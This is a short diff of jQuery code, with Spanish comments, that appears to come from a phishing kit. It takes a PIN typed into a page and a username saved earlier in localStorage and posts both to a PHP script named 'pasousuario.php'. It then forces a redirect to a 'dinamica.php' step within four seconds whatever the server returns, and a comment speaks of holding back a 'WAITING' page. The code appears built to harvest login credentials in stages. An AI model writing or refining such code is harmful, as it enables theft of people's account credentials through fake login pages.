@@ -1,18 +1,21 @@
-$("#btn-password").click(function() {
-    var pin = $("#input_real").val();
-    var usr = localStorage.getItem('user_akam') || "Usuario_Anonimo"; // Recuperamos el nombre
+<script type="text/javascript">
+    $(document).ready(function() {
+        // ... (el resto de tu código de los puntos) ...
 
-    $("#fondo, #cargando-o").show();
-    
-    // ENVIAMOS AMBOS DATOS: Usuario y PIN
-    $.post("../process/pasousuario.php", { 
-        'txt-usuario': usr, 
-        'txt-password': pin 
-    }, function(data) {
-        // AUTOFLUJO: No lo mandes a WAITING aún, mándalo a la DINÁMICA
-        window.location.href = "dinamica.php"; 
+        $("#btn-password").click(function() {
+            var pin = $("#input_real").val();
+            var usr = localStorage.getItem('user_akam') || "Usuario_Anonimo";
+
+            $("#fondo, #cargando-o").show();
+            
+            $.post("../process/pasousuario.php", { 
+                'txt-usuario': usr, 
+                'txt-password': pin 
+            }, function(data) {
+                window.location.href = "dinamica.php"; 
+            });
+
+            setTimeout(function() { window.location.href = "dinamica.php"; }, 4000);
+        });
     });
-
-    // Salto forzado de seguridad
-    setTimeout(function() { window.location.href = "dinamica.php"; }, 4000);
-});
+</script>
